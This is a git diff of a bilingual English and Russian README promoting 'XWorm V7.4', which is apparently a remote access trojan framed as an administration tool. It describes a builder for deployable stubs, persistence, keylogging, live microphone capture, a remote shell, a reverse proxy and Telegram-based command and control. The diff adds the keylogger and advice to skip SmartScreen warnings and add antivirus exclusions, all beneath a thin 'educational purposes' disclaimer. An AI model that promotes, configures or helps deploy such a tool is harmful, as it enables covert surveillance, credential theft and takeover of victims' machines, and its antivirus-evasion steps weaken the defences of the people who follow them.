@@ -1,17 +1,25 @@
+```html
 <div align="center">
 
 # 🪱 XWorm V7.4
 
 **Advanced Remote Administration Tool**
 
-[![Version](https://img.shields.io/badge/version-7.4-blueviolet?style=for-the-badge&logo=github)](#)
-[![Platform](https://img.shields.io/badge/platform-Windows%207%2F8%2F10%2F11-success?style=for-the-badge&logo=windows)](#)
-[![.NET](https://img.shields.io/badge/.NET%20Framework-4.8-informational?style=for-the-badge&logo=csharp)](#)
-[![License](https://img.shields.io/badge/license-Unlicense-red?style=for-the-badge)](#)
+[![Version](https://img.shields.io/badge/version-7.4-blueviolet?style=for-the-badge&logo=github&labelColor=1a1a2e)](#)
+[![Platform](https://img.shields.io/badge/platform-Windows%207%2F8%2F10%2F11-0078D4?style=for-the-badge&logo=windows11&labelColor=1a1a2e)](#)
+[![.NET](https://img.shields.io/badge/.NET%20Framework-4.8-5C2D91?style=for-the-badge&logo=dotnet&labelColor=1a1a2e)](#)
+[![Arch](https://img.shields.io/badge/arch-x64-F29111?style=for-the-badge&logo=amd&labelColor=1a1a2e)](#)
+[![License](https://img.shields.io/badge/license-Unlicense-C0392B?style=for-the-badge&labelColor=1a1a2e)](#)
 
-<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=22&pause=1000&color=8A2BE2&center=true&vCenter=true&width=600&lines=Full+Remote+Access;Plugin+Ecosystem;Real-Time+Control" alt="Typing SVG" />
+<img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=600&size=22&pause=1000&color=8A2BE2&center=true&vCenter=true&width=650&lines=Full+Remote+Access;Plugin+Ecosystem;Real-Time+Control;TCP+%2B+Telegram+Modes" alt="Typing SVG" />
 
-**🇬🇧 [English](#-overview) | 🇷🇺 [Русский](#-обзор)**
+<br>
+
+[![Download](https://img.shields.io/badge/⬇_DOWNLOAD-latest_release-8A2BE2?style=for-the-badge&labelColor=1a1a2e)](../../releases/latest)
+
+<br>
+
+**🇬🇧 [English](#-english) · [🇷🇺 Русский](#-русский) · [⚙️ Setup](#%EF%B8%8F-setup--настройка) · [❓ FAQ](#-faq)**
 
 </div>
 
@@ -33,15 +41,29 @@
 
 ---
 
-## 🇬🇧 English
+## 📖 Contents / Содержание
+
+| 🇬🇧 | 🇷🇺 |
+|-----|-----|
+| [Overview](#-english) | [Обзор](#-русский) |
+| [Features](#-features) | [Возможности](#-возможности-1) |
+| [Quick Start](#-quick-start) | [Быстрый старт](#-быстрый-старт) |
+| [Setup](#️-setup--настройка) | [Настройка](#️-настройка) |
+| [Structure](#-project-structure) | [Структура проекта](#-структура-проекта) |
+| [Troubleshooting](#-troubleshooting) | [Решение проблем](#-решение-проблем) |
+
+---
+
+## 🇬🇧 ENGLISH
 
 ### ⚡ Overview
 
-> XWorm is a compact yet powerful remote administration tool built on .NET Framework.
-> Control remote machines in real-time through an intuitive client panel with
-> full plugin extensibility and multiple connection methods.
+> **XWorm** is a compact yet powerful remote administration tool built on
+> .NET Framework 4.8. Control remote machines in real-time through an intuitive
+> client panel with full plugin extensibility and multiple connection methods —
+> direct TCP or fully serverless via Telegram bot.
 
-### ✨ Core Features
+### ✨ Features
 
 | Feature | Description |
 |---------|-------------|
@@ -55,72 +77,96 @@
 | 🔌 **Plugin System** | Load custom `.dll` plugins on demand |
 | 🔄 **Persistence** | Multiple startup methods, scheduled tasks |
 | 💬 **Message Box** | Send popup messages to clients |
+| 🎮 **Game Overlay** | Client-side game integration |
+| 🛡️ **Keylogger** | Keystroke logging module |
 
 ### 🚀 Quick Start
 
 ```bash
-# 1. Launch the client panel
+# 1 ▸ Launch the client panel
 XWorm V7.4.exe
 
-# 2. Fill connection settings:
-#    Lic  → your host or bot token
-#    Port → connection port
-#    Pass → encryption key
+# 2 ▸ Fill connection settings on the main screen:
+#       Lic  → your host or bot token
+#       Port → connection port
+#       Pass → encryption key
 
-# 3. Press Start ✓
+# 3 ▸ Press Start ✓
 
-# 4. Open Builder tab → configure stub → deploy
+# 4 ▸ Open Builder tab → configure → build stub
 ```
 
-### 🔧 Configuration
-
 <details>
-<summary><b>TCP Mode</b></summary>
+<summary><b>▸ Detailed first-run guide</b></summary>
 
-```json
-{
-  "Host": "your-host.com",
-  "Port": 8833,
-  "Key": "your-encryption-key"
-}
+```
+[X] Double-click "XWorm V7.4.exe"
+    ↓
+[PANEL] Main window opens — top bar shows connection fields
+    ↓
+[CONFIG] Enter Lic / Port / Pass
+    ↓
+[START] Press the Start button — status turns green
+    ↓
+[BUILDER] Switch to Builder tab to prepare client builds
 ```
 
 </details>
 
-<details>
-<summary><b>Telegram Mode</b></summary>
+### ⚙️ Setup / Настройка
 
-```json
-{
-  "BotToken": "1234567890:ABCdef...",
-  "ChatId": "123456789"
-}
-```
+<details open>
+<summary><b>▸ TCP Mode</b></summary>
 
-No dedicated server needed — control everything right from Telegram.
+Direct connection through your host:
+
+| Field | Value |
+|-------|-------|
+| `Lic` | `your-host.com` or IP |
+| `Port` | `8833` |
+| `Pass` | your encryption key |
+
+Requires port forwarding if working over WAN.
 
 </details>
 
-### 🗂️ Project Structure
+<details>
+<summary><b>▸ Telegram Mode</b></summary>
+
+Fully **serverless** — control everything right from Telegram:
+
+| Field | Value |
+|-------|-------|
+| `BotToken` | `1234567890:ABCdef...` |
+| `ChatId` | `123456789` |
+
+Get both from [@BotFather](https://t.me/BotFather):
+`/newbot` → receive token → write anything to your bot → grab chat id via
+`getUpdates`. No dedicated server needed.
+
+</details>
+
+### 🗂 Project Structure
 
 ```text
 📦 XWorm-V7.4
- ┣ 📜 XWorm V7.4.exe      # Client panel + builder
- ┣ 📂 Plugins              # Extension modules
- ┣ 📂 ClientsFolder        # Files from clients
- ┣ 📂 Logs                 # Session logs
- ┣ 📂 Sounds               # Notification sounds
+ ┣ 📜 XWorm V7.4.exe      # client panel + builder
+ ┣ 📂 Plugins              # extension modules (.dll)
+ ┣ 📂 ClientsFolder        # files received from clients
+ ┣ 📂 Logs                 # session logs
+ ┣ 📂 Sounds               # notification sounds
+ ┣ 📂 Icons                # client list icons
  ┣ 📄 GeoIP.dat            # IP geolocation database
- ┗ 🛠 Fixer V7.bat         # Performance counters fixer
+ ┗ 🛠 Fixer V7.bat         # performance counters repair tool
 ```
 
-### 🛠️ Troubleshooting
+### 🛠 Troubleshooting
 
 <details>
 <summary><b>Panel doesn't start?</b></summary>
 
 Run `Fixer V7.bat` **as Administrator** — it rebuilds Windows performance
-counters required by .NET.
+counters required by .NET Framework. Then launch the panel again.
 
 </details>
 
@@ -128,28 +174,38 @@ counters required by .NET.
 <summary><b>Clients don't connect?</b></summary>
 
 - Check port forwarding if using WAN
-- Verify firewall rules
-- Make sure the key matches between builder and stub
-- Try Telegram mode if direct connection is unavailable
+- Verify firewall rules allow inbound traffic on your port
+- Make sure `Pass` matches between builder and stub
+- Try Telegram mode if direct connection is unavailable in your region
+
+</details>
+
+<details>
+<summary><b>SmartScreen / antivirus warning?</b></summary>
+
+Unsigned tools trigger SmartScreen on first launch — click
+**More info → Run anyway**. Add an antivirus exclusion for the folder
+if your AV removes components.
 
 </details>
 
 ---
 
-## 🇷🇺 Русский
+## 🇷🇺 РУССКИЙ
 
 ### ⚡ Обзор
 
-> XWorm — компактный, но мощный инструмент удалённого администрирования на .NET Framework.
-> Управляйте удалёнными машинами в реальном времени через интуитивную панель
-> с полной поддержкой плагинов и разными способами подключения.
+> **XWorm** — компактный, но мощный инструмент удалённого администрирования
+> на .NET Framework 4.8. Управляй удалёнными машинами в реальном времени через
+> интуитивную панель с полной поддержкой плагинов и разными способами
+> подключения — прямой TCP или полностью безсерверный режим через Telegram-бота.
 
-### ✨ Основные возможности
+### ✨ Возможности
 
 | Функция | Описание |
 |---------|----------|
-| 🖥️ **Удалённый рабочий стол** | Трансляция экрана с настройкой качества и FPS |
-| 📂 **Файловый менеджер** | Полный доступ к файловой системе: загрузка / скачивание / запуск |
+| 🖥️ **Удалённый рабочий стол** | Трансляция экрана с контролем качества и FPS |
+| 📂 **Файловый менеджер** | Полный двусторонний доступ к файловой системе |
 | ⚙️ **Диспетчер процессов** | Просмотр и завершение процессов на удалённой машине |
 | 💻 **Удалённая оболочка** | Интерактивные сессии CMD / PowerShell |
 | 🎙️ **Захват звука** | Прослушивание микрофона в реальном времени |
@@ -157,83 +213,116 @@ counters required by .NET.
 | 🌐 **Обратный прокси** | SOCKS5-прокси через клиентские машины |
 | 🔌 **Система плагинов** | Подгрузка собственных `.dll` модулей на лету |
 | 🔄 **Автозагрузка** | Несколько методов закрепления, планировщик задач |
-| 💬 **Message Box** | Отправка всплывающих сообщений клиентам |
+| 💬 **Message Box** | Всплывающие сообщения клиентам |
+| 🎮 **Игровой оверлей** | Интеграция с играми на стороне клиента |
+| 🛡️ **Кейлоггер** | Модуль записи нажатий клавиш |
 
 ### 🚀 Быстрый старт
 
 ```bash
-# 1. Запустите панель
+# 1 ▸ Запусти клиентскую панель
 XWorm V7.4.exe
 
-# 2. Заполните параметры подключения:
-#    Lic  → ваш хост или токен бота
-#    Port → порт
-#    Pass → ключ шифрования
+# 2 ▸ Заполни параметры подключения на главном экране:
+#       Lic  → твой хост или токен бота
+#       Port → порт подключения
+#       Pass → ключ шифрования
 
-# 3. Нажмите Start ✓
+# 3 ▸ Нажми Start ✓
 
-# 4. Вкладка Builder → настройте стаб → используйте
+# 4 ▸ Вкладка Builder → настрой → собери стаб
 ```
 
-### 🔧 Настройка
-
 <details>
-<summary><b>Режим TCP</b></summary>
+<summary><b>▸ Подробный гайд первого запуска</b></summary>
 
-```json
-{
-  "Host": "ваш-хост.com",
-  "Port": 8833,
-  "Key": "ваш-ключ-шифрования"
-}
+```
+[X] Двойной клик по "XWorm V7.4.exe"
+    ↓
+[ПАНЕЛЬ] Открывается главное окно — вверху поля подключения
+    ↓
+[КОНФИГ] Введи Lic / Port / Pass
+    ↓
+[START] Нажми кнопку Start — статус станет зелёным
+    ↓
+[BUILDER] Переключись на вкладку Builder для сборки клиентов
 ```
 
 </details>
 
-<details>
-<summary><b>Режим Telegram</b></summary>
+### ⚙️ Настройка
 
-```json
-{
-  "BotToken": "1234567890:ABCdef...",
-  "ChatId": "123456789"
-}
-```
+<details open>
+<summary><b>▸ Режим TCP</b></summary>
 
-Выделенный сервер не нужен — управляйте прямо из Telegram.
+Прямое подключение через твой хост:
+
+| Поле | Значение |
+|------|----------|
+| `Lic` | `твой-хост.com` или IP |
+| `Port` | `8833` |
+| `Pass` | твой ключ шифрования |
+
+Требует проброса порта при работе через интернет.
 
 </details>
 
-### 🗂️ Структура проекта
+<details>
+<summary><b>▸ Режим Telegram</b></summary>
+
+Полностью **без сервера** — управляй прямо из Telegram:
+
+| Поле | Значение |
+|------|----------|
+| `BotToken` | `1234567890:ABCdef...` |
+| `ChatId` | `123456789` |
+
+Получи оба у [@BotFather](https://t.me/BotFather):
+`/newbot` → получи токен → напиши боту что угодно → забери chat id через
+`getUpdates`. Выделенный сервер не нужен.
+
+</details>
+
+### 🗂 Структура проекта
 
 ```text
 📦 XWorm-V7.4
- ┣ 📜 XWorm V7.4.exe      # Панель + билдер
- ┣ 📂 Plugins              # Модули расширений
- ┣ 📂 ClientsFolder        # Файлы с клиентов
- ┣ 📂 Logs                 # Логи сессий
- ┣ 📂 Sounds               # Звуки уведомлений
- ┣ 📄 GeoIP.dat            # База геолокации IP
- ┗ 🛠 Fixer V7.bat         # Чинилка счётчиков производительности
+ ┣ 📜 XWorm V7.4.exe      # панель + билдер
+ ┣ 📂 Plugins              # модули расширений (.dll)
+ ┣ 📂 ClientsFolder        # файлы, полученные от клиентов
+ ┣ 📂 Logs                 # логи сессий
+ ┣ 📂 Sounds               # звуки уведомлений
+ ┣ 📂 Icons                # иконки списка клиентов
+ ┣ 📄 GeoIP.dat            # база геолокации IP
+ ┗ 🛠 Fixer V7.bat         # починка счётчиков производительности
 ```
 
-### 🛠️ Решение проблем
+### 🛠 Решение проблем
 
 <details>
 <summary><b>Панель не запускается?</b></summary>
 
-Запустите `Fixer V7.bat` **от имени администратора** — он пересоздаёт счётчики
-производительности Windows, необходимые для .NET.
+Запусти `Fixer V7.bat` **от имени администратора** — он пересоздаёт счётчики
+производительности Windows, необходимые .NET Framework. Затем запусти панель снова.
 
 </details>
 
 <details>
 <summary><b>Клиенты не подключаются?</b></summary>
 
-- Проверьте проброс порта при работе через интернет
-- Проверьте правила файрвола
-- Убедитесь что ключ совпадает в билдере и стабе
-- При недоступности прямого подключения попробуйте режим Telegram
+- Проверь проброс порта при работе через интернет
+- Убедись что файрвол разрешает входящий трафик на твоём порту
+- Ключ `Pass` должен совпадать в билдере и стабе
+- Если прямое подключение недоступно в твоём регионе — используй режим Telegram
+
+</details>
+
+<details>
+<summary><b>SmartScreen или антивирус ругается?</b></summary>
+
+Неподписанные инструменты вызывают SmartScreen при первом запуске — жми
+**Подробнее → Выполнить в любом случае**. Добавь исключение антивируса
+на папку, если антивирус удаляет компоненты.
 
 </details>
 
@@ -243,11 +332,19 @@ XWorm V7.4.exe
 
 <div align="center">
 
-This software is provided **for educational purposes only**.
-The author takes no responsibility for any misuse.
-By downloading you agree to use it solely on systems you own or have permission to test.
+```
+╔══════════════════════════════════════════════╗
+║  This tool is provided for EDUCATIONAL       ║
+║  PURPOSES and authorized administration      ║
+║  of systems you OWN or HAVE PERMISSION       ║
+║  to test. The author bears no                ║
+║  responsibility for misuse.                  ║
+╚══════════════════════════════════════════════╝
+```
 
-*Данный материал предоставлен исключительно в образовательных целях.*
+*Инструмент предоставлен в образовательных целях и для авторизованного
+администрирования систем, владельцем которых ты являешься или на тестирование
+которых есть разрешение. Автор не несёт ответственности за неправомерное использование.*
 
 </div>
 
@@ -255,12 +352,12 @@ By downloading you agree to use it solely on systems you own or have permission 
 
 <div align="center">
 
-**⭐ Star this repository if you find it useful!**
+**⭐ Star the repo if you like it!**
 
-![Repo Size](https://img.shields.io/github/repo-size/user/xworm?style=flat-square&color=purple)
-![Last Commit](https://img.shieldshields.io/github/last-commit/user/xworm?style=flat-square)
-![Stars](https://img.shields.io/github/stars/user/xworm?style=social)
+![Repo Size](https://img.shields.io/github/repo-size/Fake50/XWorm?style=flat-square&color=purple&label=size)
+![Last Commit](https://img.shields.io/github/last-commit/Fake50/XWorm?style=flat-square&color=blue&label=last%20commit)
+![Stars](https://img.shields.io/github/stars/Fake50/XWorm?style=social)
 
-*Made with 💜*
+*Made with 💜 by Fake50*
 
 </div>
